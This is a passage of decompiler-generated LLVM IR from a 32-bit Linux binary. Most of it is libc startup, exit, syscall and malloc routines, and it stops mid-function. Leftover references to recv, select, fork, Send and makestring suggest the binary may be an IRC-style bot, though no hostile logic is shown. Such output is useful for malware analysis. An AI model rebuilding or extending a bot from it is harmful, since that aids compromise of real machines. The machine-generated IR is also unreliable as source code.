  uselistorder i32 %storemerge21, { 2, 3, 0, 1 }
  uselistorder i32 %v2_80497b0, { 3, 1, 2, 0 }
  uselistorder i32 %v2_8049790, { 1, 0, 2 }
  uselistorder i32 %v5_8049707, { 1, 0, 2, 3, 4 }
  uselistorder i8* %tmp112, { 1, 0, 2, 3 }
  uselistorder i8* %tmp110, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804968b, { 1, 0, 2, 3 }
  uselistorder i8* %tmp109, { 1, 0, 2 }
  uselistorder i32 %v3_80497049, { 1, 0 }
  uselistorder i32 %stack_var_-72.0, { 4, 3, 0, 2, 1, 5 }
  uselistorder i32* %tmp108, { 1, 0, 2 }
  uselistorder i32* %v2_80495a8, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32 %v2_8049587, { 1, 0, 3, 5, 6, 2, 4, 12, 10, 11, 13, 14, 7, 8, 9, 16, 15, 17 }
  uselistorder i8** %stack_var_-6828, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-6832, { 22, 21, 23, 24, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 9, 8, 10, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-656, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1680, { 1, 0, 2 }
  uselistorder i8** %stack_var_-20, { 21, 12, 5, 10, 9, 11, 0, 14, 8, 16, 1, 17, 4, 19, 13, 7, 15, 2, 18, 3, 20, 6 }
  uselistorder i8** %stack_var_-24, { 13, 12, 11, 10, 9, 0, 1, 8, 7, 6, 5, 2, 14, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 19, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 25, 26, 3, 4, 5, 10, 11, 6, 7, 8, 9, 97, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 27, 28, 29, 32, 33, 30, 31, 44, 34, 36, 35, 2, 37, 39, 38, 96, 40, 41, 42, 43, 98, 45, 46, 1, 47, 48, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 69, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 82, 79, 80, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95 }
  uselistorder [4 x i8]** @global_var_8056500.317, { 1, 0 }
  uselistorder i32 (i32)* @strtok, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 1, 0 }
  uselistorder i32* @global_var_8056f50.269, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_8056570.268, { 5, 6, 1, 7, 8, 9, 2, 0, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_80543e1.295 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ()* @getpid, { 1, 0 }
  uselistorder i32 ()* @fork, { 2, 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054436.306, i32 0, i32 0), { 1, 0 }
  uselistorder i32 (i32*)* @fclose, { 0, 2, 1, 3 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805442c.304, i32 0, i32 0), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_805441f.303 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_805440c.302 to i32), { 0, 2, 1 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054306.270, i32 0, i32 0), { 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_8049c9f, { 1, 0 }
  uselistorder label %dec_label_pc_8049c0c, { 1, 0 }
  uselistorder label %dec_label_pc_8049bae, { 1, 0 }
  uselistorder label %dec_label_pc_8049ba2, { 1, 0 }
  uselistorder label %dec_label_pc_8049b30, { 1, 0 }
  uselistorder label %bb124, { 1, 0 }
  uselistorder label %dec_label_pc_8049a92, { 1, 0 }
  uselistorder label %dec_label_pc_8049a81, { 1, 0 }
  uselistorder label %dec_label_pc_8049a68, { 1, 0 }
  uselistorder label %dec_label_pc_8049a3c, { 1, 0 }
  uselistorder label %dec_label_pc_80499c7, { 1, 0 }
  uselistorder label %dec_label_pc_8049994, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_8049905, { 1, 0 }
  uselistorder label %dec_label_pc_8049905.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80498a6, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80497ef, { 1, 0 }
  uselistorder label %dec_label_pc_804976e, { 1, 0 }
  uselistorder label %dec_label_pc_804975b, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049656, { 1, 0 }
  uselistorder label %dec_label_pc_80495f0, { 1, 0 }
}

define i32 @toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cb8 = add i32 %arg1, -97
  %v6_8049cbe = icmp ugt i32 %v1_8049cb8, 25
  br i1 %v6_8049cbe, label %dec_label_pc_8049cc3, label %dec_label_pc_8049cc0

dec_label_pc_8049cc0:                             ; preds = %entry
  %v1_8049cc0 = and i32 %arg1, 95
  br label %dec_label_pc_8049cc3

dec_label_pc_8049cc3:                             ; preds = %entry, %dec_label_pc_8049cc0
  %v0_8049cc3 = phi i32 [ %arg1, %entry ], [ %v1_8049cc0, %dec_label_pc_8049cc0 ]
  ret i32 %v0_8049cc3

; uselistorder directives
  uselistorder label %dec_label_pc_8049cc3, { 1, 0 }
}

define i32 @__toupper_l(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cca = add i32 %arg1, -97
  %v6_8049cd0 = icmp ugt i32 %v1_8049cca, 25
  br i1 %v6_8049cd0, label %dec_label_pc_8049cd5, label %dec_label_pc_8049cd2

dec_label_pc_8049cd2:                             ; preds = %entry
  %v1_8049cd2 = and i32 %arg1, 95
  br label %dec_label_pc_8049cd5

dec_label_pc_8049cd5:                             ; preds = %entry, %dec_label_pc_8049cd2
  %v0_8049cd5 = phi i32 [ %arg1, %entry ], [ %v1_8049cd2, %dec_label_pc_8049cd2 ]
  ret i32 %v0_8049cd5

; uselistorder directives
  uselistorder label %dec_label_pc_8049cd5, { 1, 0 }
}

define i32 @dummy() local_unnamed_addr {
entry:
  %v0_8049cd8 = load i32, i32* @eax, align 4
  ret i32 %v0_8049cd8
}

define i32 @dummy1(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049cd9 = load i32, i32* @eax, align 4
  ret i32 %v0_8049cd9
}

define i32 @__libc_start_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = ptrtoint i32* %arg3 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  store i32 %tmp21, i32* @ebp, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8049cf2 = load i32, i32* %arg3, align 4
  store i32 %v2_8049cf2, i32* @ebx, align 4
  %v2_8049cf5 = mul i32 %arg2, 4
  %v3_8049cf5 = add i32 %v2_8049cf5, 4
  %v4_8049cf5 = add i32 %v3_8049cf5, %tmp21
  store i32 %v4_8049cf5, i32* @esi, align 4
  store i32 %v4_8049cf5, i32* @global_var_8056e04.320, align 4
  br label %dec_label_pc_8049d01

dec_label_pc_8049d01:                             ; preds = %dec_label_pc_8049d01, %entry
  %v0_8049d01 = phi i32 [ %v1_8049d05, %dec_label_pc_8049d01 ], [ %v4_8049cf5, %entry ]
  %v1_8049d01 = inttoptr i32 %v0_8049d01 to i32*
  %v2_8049d01 = load i32, i32* %v1_8049d01, align 4
  store i32 %v2_8049d01, i32* %eax.global-to-local, align 4
  store i32 %v0_8049d01, i32* @edi, align 4
  %v1_8049d05 = add i32 %v0_8049d01, 4
  store i32 %v1_8049d05, i32* @edx, align 4
  %v1_8049d08 = icmp eq i32 %v2_8049d01, 0
  %v1_8049d0a = icmp eq i1 %v1_8049d08, false
  br i1 %v1_8049d0a, label %dec_label_pc_8049d01, label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %dec_label_pc_8049d01
  %v2_8049d0c = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_8049d0c, i32* %eax.global-to-local, align 4
  %v3_8049d19 = bitcast i32* %stack_var_-192 to i8*
  %v4_8049d19 = call i32 @memset(i8* %v3_8049d19, i32 0, i32 152)
  %v0_8049d1e = load i32, i32* @edi, align 4
  %v1_8049d1e = add i32 %v0_8049d1e, 4
  store i32 %v1_8049d1e, i32* %eax.global-to-local, align 4
  store i32 %v0_8049d1e, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049d1e, i32* @global_var_8056f90.321, align 16
  %v2_8049d3c47 = inttoptr i32 %v1_8049d1e to i32*
  %v3_8049d3c48 = load i32, i32* %v2_8049d3c47, align 4
  %v1_8049d3f49 = icmp eq i32 %v3_8049d3c48, 0
  %v1_8049d4150 = icmp eq i1 %v1_8049d3f49, false
  br i1 %v1_8049d4150, label %dec_label_pc_8049d2d, label %dec_label_pc_8049d43

dec_label_pc_8049d2d:                             ; preds = %dec_label_pc_8049d0c, %dec_label_pc_8049d39
  %v3_8049d3c52 = phi i32 [ %v3_8049d3c, %dec_label_pc_8049d39 ], [ %v3_8049d3c48, %dec_label_pc_8049d0c ]
  %v0_8049d3251 = phi i32 [ %v1_8049d39, %dec_label_pc_8049d39 ], [ %v0_8049d1e, %dec_label_pc_8049d0c ]
  %v6_8049d30 = icmp ugt i32 %v3_8049d3c52, 37
  br i1 %v6_8049d30, label %dec_label_pc_8049d39, label %dec_label_pc_8049d32

dec_label_pc_8049d32:                             ; preds = %dec_label_pc_8049d2d
  %v1_8049d32 = add i32 %v0_8049d3251, 8
  %v2_8049d32 = inttoptr i32 %v1_8049d32 to i32*
  %v3_8049d32 = load i32, i32* %v2_8049d32, align 4
  store i32 %v3_8049d32, i32* %eax.global-to-local, align 4
  %v1_8049d35 = load i32, i32* @esp, align 4
  %v3_8049d35 = mul i32 %v3_8049d3c52, 4
  %v4_8049d35 = add i32 %v3_8049d35, 12
  %v5_8049d35 = add i32 %v4_8049d35, %v1_8049d35
  %v6_8049d35 = inttoptr i32 %v5_8049d35 to i32*
  store i32 %v3_8049d32, i32* %v6_8049d35, align 4
  %v0_8049d39.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8049d39

dec_label_pc_8049d39:                             ; preds = %dec_label_pc_8049d2d, %dec_label_pc_8049d32
  %v0_8049d39 = phi i32 [ %v0_8049d3251, %dec_label_pc_8049d2d ], [ %v0_8049d39.pre, %dec_label_pc_8049d32 ]
  %v1_8049d39 = add i32 %v0_8049d39, 8
  store i32 %v1_8049d39, i32* %ecx.global-to-local, align 4
  %v1_8049d3c = add i32 %v0_8049d39, 12
  %v2_8049d3c = inttoptr i32 %v1_8049d3c to i32*
  %v3_8049d3c = load i32, i32* %v2_8049d3c, align 4
  %v1_8049d3f = icmp eq i32 %v3_8049d3c, 0
  %v1_8049d41 = icmp eq i1 %v1_8049d3f, false
  br i1 %v1_8049d41, label %dec_label_pc_8049d2d, label %dec_label_pc_8049d43

dec_label_pc_8049d43:                             ; preds = %dec_label_pc_8049d39, %dec_label_pc_8049d0c
  %v3_8049d3c.lcssa = phi i32 [ %v3_8049d3c48, %dec_label_pc_8049d0c ], [ %v3_8049d3c, %dec_label_pc_8049d39 ]
  %v1_8049d47 = icmp eq i32 %v2_8049cf2, 0
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  store i32 %tmp16, i32* @global_var_8056f98.324, align 8
  br i1 %v1_8049d47, label %dec_label_pc_8049d88, label %dec_label_pc_8049d65

dec_label_pc_8049d65:                             ; preds = %dec_label_pc_8049d43
  %v1_8049d65 = add i32 %v2_8049cf2, 1
  store i32 %v1_8049d65, i32* %eax.global-to-local, align 4
  store i32 %v2_8049cf2, i32* @global_var_8056988.325, align 8
  store i32 %v2_8049cf2, i32* @global_var_8056984.326, align 4
  %v2_8049d8135 = inttoptr i32 %v2_8049cf2 to i8*
  %v3_8049d8136 = load i8, i8* %v2_8049d8135, align 1
  %v4_8049d8137 = zext i8 %v3_8049d8136 to i32
  %v6_8049d8138 = and i32 %v3_8049d3c.lcssa, -256
  %v7_8049d8139 = or i32 %v4_8049d8137, %v6_8049d8138
  %v4_8049d8440 = icmp eq i8 %v3_8049d8136, 0
  %v1_8049d8642 = icmp eq i1 %v4_8049d8440, false
  br i1 %v1_8049d8642, label %dec_label_pc_8049d76, label %dec_label_pc_8049d88

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d65, %dec_label_pc_8049d80
  %v7_8049d8145 = phi i32 [ %v7_8049d81, %dec_label_pc_8049d80 ], [ %v7_8049d8139, %dec_label_pc_8049d65 ]
  %v3_8049d8144 = phi i8 [ %v3_8049d81, %dec_label_pc_8049d80 ], [ %v3_8049d8136, %dec_label_pc_8049d65 ]
  %v0_8049d8043 = phi i32 [ %v1_8049d80, %dec_label_pc_8049d80 ], [ %v1_8049d65, %dec_label_pc_8049d65 ]
  %v10_8049d76 = icmp eq i8 %v3_8049d8144, 47
  %v1_8049d79 = icmp eq i1 %v10_8049d76, false
  br i1 %v1_8049d79, label %dec_label_pc_8049d80, label %dec_label_pc_8049d7b

dec_label_pc_8049d7b:                             ; preds = %dec_label_pc_8049d76
  store i32 %v0_8049d8043, i32* @global_var_8056984.326, align 4
  br label %dec_label_pc_8049d80

dec_label_pc_8049d80:                             ; preds = %dec_label_pc_8049d76, %dec_label_pc_8049d7b
  %v1_8049d80 = add i32 %v0_8049d8043, 1
  store i32 %v1_8049d80, i32* %eax.global-to-local, align 4
  %v2_8049d81 = inttoptr i32 %v0_8049d8043 to i8*
  %v3_8049d81 = load i8, i8* %v2_8049d81, align 1
  %v4_8049d81 = zext i8 %v3_8049d81 to i32
  %v6_8049d81 = and i32 %v7_8049d8145, -256
  %v7_8049d81 = or i32 %v4_8049d81, %v6_8049d81
  %v4_8049d84 = icmp eq i8 %v3_8049d81, 0
  %v1_8049d86 = icmp eq i1 %v4_8049d84, false
  br i1 %v1_8049d86, label %dec_label_pc_8049d76, label %dec_label_pc_8049d88

dec_label_pc_8049d88:                             ; preds = %dec_label_pc_8049d65, %dec_label_pc_8049d80, %dec_label_pc_8049d43
  store i32 %v2_8049d0c, i32* %eax.global-to-local, align 4
  %v1_8049d90 = call i32 @__init_tls(i32 %v2_8049d0c)
  store i32 %v1_8049d90, i32* @eax, align 4
  %v1_8049d9a = call i32 @dummy1(i32 %tmp15)
  store i32 %tmp14, i32* %eax.global-to-local, align 4
  %v15_8049da6 = icmp eq i32 %tmp14, %tmp13
  %v1_8049daa = icmp eq i1 %v15_8049da6, false
  br i1 %v1_8049daa, label %dec_label_pc_8049dbd, label %dec_label_pc_8049dac

dec_label_pc_8049dac:                             ; preds = %dec_label_pc_8049d88
  store i32 %tmp12, i32* %eax.global-to-local, align 4
  %v15_8049db0 = icmp eq i32 %tmp12, %tmp11
  %v1_8049db4 = icmp eq i1 %v15_8049db0, false
  br i1 %v1_8049db4, label %dec_label_pc_8049dbd, label %dec_label_pc_8049db6

dec_label_pc_8049db6:                             ; preds = %dec_label_pc_8049dac
  %v4_8049db6 = icmp eq i32 %tmp10, 0
  br i1 %v4_8049db6, label %dec_label_pc_8049e2a, label %dec_label_pc_8049dbd

dec_label_pc_8049dbd:                             ; preds = %dec_label_pc_8049db6, %dec_label_pc_8049dac, %dec_label_pc_8049d88
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 3, i32* %ecx.global-to-local, align 4
  %v2_8049dc5 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v6_8049dcc = add i32 %v2_8049dc5, 4
  store i32 %v6_8049dcc, i32* %edi.global-to-local, align 4
  store i32 %v2_8049dc5, i32* @ebx, align 4
  store i32 %v2_8049dc5, i32* @edx, align 4
  %v2_8049dd6 = inttoptr i32 %v6_8049dcc to i32*
  store i32 0, i32* %v2_8049dd6, align 4
  %v3_8049dd6 = load i32, i32* %edi.global-to-local, align 4
  %v6_8049dd6 = add i32 %v3_8049dd6, 4
  store i32 %v6_8049dd6, i32* %edi.global-to-local, align 4
  %v0_8049dd7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049dd7 = inttoptr i32 %v6_8049dd6 to i32*
  store i32 %v0_8049dd7, i32* %v2_8049dd7, align 4
  %v3_8049dd7 = load i32, i32* %edi.global-to-local, align 4
  %v6_8049dd7 = add i32 %v3_8049dd7, 4
  store i32 %v6_8049dd7, i32* %edi.global-to-local, align 4
  %v0_8049dd8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049dd8 = inttoptr i32 %v6_8049dd7 to i32*
  store i32 %v0_8049dd8, i32* %v2_8049dd8, align 4
  %v3_8049dd8 = load i32, i32* %edi.global-to-local, align 4
  %v6_8049dd8 = add i32 %v3_8049dd8, 4
  store i32 %v6_8049dd8, i32* %edi.global-to-local, align 4
  %v0_8049dd9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049dd9 = inttoptr i32 %v6_8049dd8 to i32*
  store i32 %v0_8049dd9, i32* %v2_8049dd9, align 4
  %v3_8049dd9 = load i32, i32* %edi.global-to-local, align 4
  %v6_8049dd9 = add i32 %v3_8049dd9, 4
  %v0_8049dda = load i32, i32* %eax.global-to-local, align 4
  %v2_8049dda = inttoptr i32 %v6_8049dd9 to i32*
  store i32 %v0_8049dda, i32* %v2_8049dda, align 4
  %v0_8049ddb = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ddb = and i32 %v0_8049ddb, -256
  %v2_8049ddb = or i32 %v1_8049ddb, 168
  store i32 %v2_8049ddb, i32* @eax, align 4
  store i32 0, i32* @edi, align 4
  %v0_8049df5 = load i32, i32* %stack_var_-40, align 4
  %v1_8049df5 = call i32 @__vsyscall(i32 %v0_8049df5)
  store i32 %v1_8049df5, i32* %eax.global-to-local, align 4
  %v1_8049dfa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8049dfa

dec_label_pc_8049dfa:                             ; preds = %dec_label_pc_8049e1a, %dec_label_pc_8049dbd
  %v1_8049dfa = phi i32 [ %v1_8049e1a, %dec_label_pc_8049e1a ], [ %v1_8049dfa.pre, %dec_label_pc_8049dbd ]
  %v0_8049dfa = load i32, i32* @ebx, align 4
  %v2_8049dfa = mul i32 %v1_8049dfa, 8
  %v3_8049dfa = add i32 %v0_8049dfa, 6
  %v4_8049dfa = add i32 %v3_8049dfa, %v2_8049dfa
  %v5_8049dfa = inttoptr i32 %v4_8049dfa to i8*
  %v6_8049dfa = load i8, i8* %v5_8049dfa, align 1
  %v7_8049dfa = and i8 %v6_8049dfa, 32
  %v8_8049dfa = icmp eq i8 %v7_8049dfa, 0
  br i1 %v8_8049dfa, label %dec_label_pc_8049e1a, label %dec_label_pc_8049e01

dec_label_pc_8049e01:                             ; preds = %dec_label_pc_8049dfa
  store i32 ptrtoint ([10 x i8]* @global_var_8054487.327 to i32), i32* @edx, align 4
  store i32 5, i32* @eax, align 4
  store i32 32770, i32* %ecx.global-to-local, align 4
  %v1_8049e10 = call i32 @__vsyscall(i32 2)
  store i32 %v1_8049e10, i32* %eax.global-to-local, align 4
  %v0_8049e1a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8049e1a

dec_label_pc_8049e1a:                             ; preds = %dec_label_pc_8049e01, %dec_label_pc_8049dfa
  %v0_8049e1a = phi i32 [ %v0_8049e1a.pre, %dec_label_pc_8049e01 ], [ %v1_8049dfa, %dec_label_pc_8049dfa ]
  %v1_8049e1a = add i32 %v0_8049e1a, 1
  store i32 %v1_8049e1a, i32* @edi, align 4
  %v9_8049e1b = icmp eq i32 %v0_8049e1a, 2
  %v1_8049e1e = icmp eq i1 %v9_8049e1b, false
  br i1 %v1_8049e1e, label %dec_label_pc_8049dfa, label %dec_label_pc_8049e20

dec_label_pc_8049e20:                             ; preds = %dec_label_pc_8049e1a
  store i32 1, i32* @global_var_8056f88.328, align 8
  br label %dec_label_pc_8049e2a

dec_label_pc_8049e2a:                             ; preds = %dec_label_pc_8049db6, %dec_label_pc_8049e20
  %v0_8049e2a = call i32 @_init()
  store i32 ptrtoint (i32* @global_var_8056074.329 to i32), i32* @ebx, align 4
  br i1 icmp ult (i32 ptrtoint (i32* @global_var_8056074.329 to i32), i32 134570100), label %dec_label_pc_8049e36, label %dec_label_pc_8049e43

dec_label_pc_8049e36:                             ; preds = %dec_label_pc_8049e2a, %dec_label_pc_8049e36
  %v4_8049e3634 = phi i32 [ %v1_8049e38, %dec_label_pc_8049e36 ], [ ptrtoint (i32* @global_var_8056074.329 to i32), %dec_label_pc_8049e2a ]
  %v5_8049e36 = inttoptr i32 %v4_8049e3634 to i32*
  %v6_8049e36 = load i32, i32* %v5_8049e36, align 4
  call void @__pseudo_call(i32 %v6_8049e36)
  %v0_8049e38 = load i32, i32* @ebx, align 4
  %v1_8049e38 = add i32 %v0_8049e38, 4
  store i32 %v1_8049e38, i32* @ebx, align 4
  %v5_8049e3b = icmp ult i32 %v1_8049e38, 134570100
  br i1 %v5_8049e3b, label %dec_label_pc_8049e36, label %dec_label_pc_8049e43

dec_label_pc_8049e43:                             ; preds = %dec_label_pc_8049e36, %dec_label_pc_8049e2a
  call void @__pseudo_call(i32 %arg1)
  %v1_8049e57 = call i32 @exit(i32 %v0_8049e2a)
  store i32 %v1_8049e57, i32* %eax.global-to-local, align 4
  ret i32 %v1_8049e57

; uselistorder directives
  uselistorder i32 %v1_8049e38, { 2, 1, 0 }
  uselistorder i32 %v1_8049e1a, { 1, 0 }
  uselistorder i32 %v2_8049dc5, { 1, 2, 0 }
  uselistorder i8 %v3_8049d81, { 1, 2, 0 }
  uselistorder i32 %v1_8049d80, { 1, 0 }
  uselistorder i32 %v0_8049d8043, { 0, 2, 1 }
  uselistorder i32 %v3_8049d3c, { 0, 2, 1 }
  uselistorder i32 %v1_8049d39, { 1, 0 }
  uselistorder i32 %v0_8049d3251, { 1, 0 }
  uselistorder i32 %v3_8049d3c52, { 1, 0 }
  uselistorder i32 %v1_8049d05, { 1, 0 }
  uselistorder i32 %v0_8049d01, { 2, 1, 0 }
  uselistorder i32 %v2_8049cf2, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %tmp16, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 19, 16, 17, 18 }
  uselistorder i32 (i32)* @exit, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 134570100, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049e36, { 1, 0 }
  uselistorder label %dec_label_pc_8049e2a, { 1, 0 }
  uselistorder label %dec_label_pc_8049d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049d80, { 1, 0 }
  uselistorder label %dec_label_pc_8049d76, { 1, 0 }
  uselistorder label %dec_label_pc_8049d39, { 1, 0 }
  uselistorder label %dec_label_pc_8049d2d, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @dummy.1(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049e68 = load i32, i32* @eax, align 4
  ret i32 %v0_8049e68
}

define i32 @exit(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049e69 = load i32, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8056074.329 to i32), i32* @ebx, align 4
  %v1_8049e72 = call i32 @dummy.1(i32 %v0_8049e69)
  store i32 %v1_8049e72, i32* @eax, align 4
  %v0_8049e7e6 = load i32, i32* @ebx, align 4
  %v6_8049e8414 = icmp ugt i32 %v0_8049e7e6, ptrtoint (i32* @global_var_8056074.329 to i32)
  br i1 %v6_8049e8414, label %dec_label_pc_8049e79, label %dec_label_pc_8049e86

dec_label_pc_8049e79:                             ; preds = %entry, %dec_label_pc_8049e79
  %v0_8049e7e15 = phi i32 [ %v0_8049e7e, %dec_label_pc_8049e79 ], [ %v0_8049e7e6, %entry ]
  %v1_8049e79 = add i32 %v0_8049e7e15, -4
  store i32 %v1_8049e79, i32* @ebx, align 4
  %v5_8049e7c = inttoptr i32 %v1_8049e79 to i32*
  %v6_8049e7c = load i32, i32* %v5_8049e7c, align 4
  call void @__pseudo_call(i32 %v6_8049e7c)
  %v0_8049e7e = load i32, i32* @ebx, align 4
  %v6_8049e84 = icmp ugt i32 %v0_8049e7e, ptrtoint (i32* @global_var_8056074.329 to i32)
  br i1 %v6_8049e84, label %dec_label_pc_8049e79, label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e79, %entry
  %v0_8049e86 = call i32 @_fini()
  %v0_8049e8b = call i32 @__stdio_exit()
  %v1_8049e97 = call i32 @_Exit(i32 %arg1)
  ret i32 %v1_8049e97

; uselistorder directives
  uselistorder i32 %v0_8049e7e, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056074.329 to i32), { 4, 1, 5, 0, 3, 2 }
  uselistorder label %dec_label_pc_8049e79, { 1, 0 }
}

define i32 @__vsyscall(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049e9c = load i32, i32* @edi, align 4
  %v0_8049e9d = load i32, i32* @ebx, align 4
  %v0_8049e9e = load i32, i32* @edx, align 4
  %v0_8049ea6 = load i32, i32* @eax, align 4
  %v3_8049ea7 = call i32 @function_8049eb2(i32 %v0_8049ea6, i32 %v0_8049e9d, i32 %v0_8049e9c)
  store i32 %v0_8049e9e, i32* @edx, align 4
  store i32 %v0_8049e9d, i32* @ebx, align 4
  store i32 %v0_8049e9c, i32* @edi, align 4
  ret i32 %v3_8049ea7
}

define i32 @function_8049eb2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8049eb2:
  %v1_8049eb5 = add i32 %arg1, 53512
  %v1_8049eba = inttoptr i32 %v1_8049eb5 to i32*
  %v2_8049eba = load i32, i32* %v1_8049eba, align 4
  %v1_8049ebc = icmp eq i32 %v2_8049eba, 0
  br i1 %v1_8049ebc, label %dec_label_pc_8049ec6, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb2
  ret i32 %arg2

dec_label_pc_8049ec6:                             ; preds = %dec_label_pc_8049eb2
  %v1_8049eca = call i32 @int80_syscall(i32 %arg2)
  ret i32 %v1_8049eca

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__vsyscall6(i32* %arg1) local_unnamed_addr {
entry:
  %v0_8049ece = load i32, i32* @eax, align 4
  %v2_8049ed3 = load i32, i32* %arg1, align 4
  store i32 %v0_8049ece, i32* @eax, align 4
  %v1_8049ede = call i32 @__vsyscall(i32 %v2_8049ed3)
  ret i32 %v1_8049ede
}

define i32 @__syscall() local_unnamed_addr {
entry:
  %stack_var_24 = alloca i32, align 4
  %v0_8049eec = load i32, i32* @edi, align 4
  %v2_8049f02 = call i32 @__vsyscall6(i32* nonnull %stack_var_24)
  store i32 %v0_8049eec, i32* @edi, align 4
  ret i32 %v2_8049f02
}

define i32 @__simple_malloc(i32 %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049f11 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049f1a = icmp eq i32 %arg1, 0
  br i1 %v1_8049f1a, label %dec_label_pc_8049fd5, label %dec_label_pc_8049f22

dec_label_pc_8049f22:                             ; preds = %entry
  store i32 0, i32* @edi, align 4
  %v9_8049f24 = icmp eq i32 %arg1, 1
  br i1 %v9_8049f24, label %dec_label_pc_8049f3d, label %dec_label_pc_8049f29

dec_label_pc_8049f29:                             ; preds = %dec_label_pc_8049f22
  br label %dec_label_pc_8049f30

dec_label_pc_8049f30:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049f29
  %v0_8049fc41 = phi i32 [ %v2_8049f30, %dec_label_pc_8049fc4 ], [ 1, %dec_label_pc_8049f29 ]
  %v2_8049f30 = mul i32 %v0_8049fc41, 2
  %v6_8049f34 = icmp ult i32 %v2_8049f30, %arg1
  br i1 %v6_8049f34, label %dec_label_pc_8049fc4, label %dec_label_pc_8049f3a

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049f30
  %v1_8049f3a = add i32 %v2_8049f30, -1
  store i32 %v1_8049f3a, i32* @edi, align 4
  br label %dec_label_pc_8049f3d

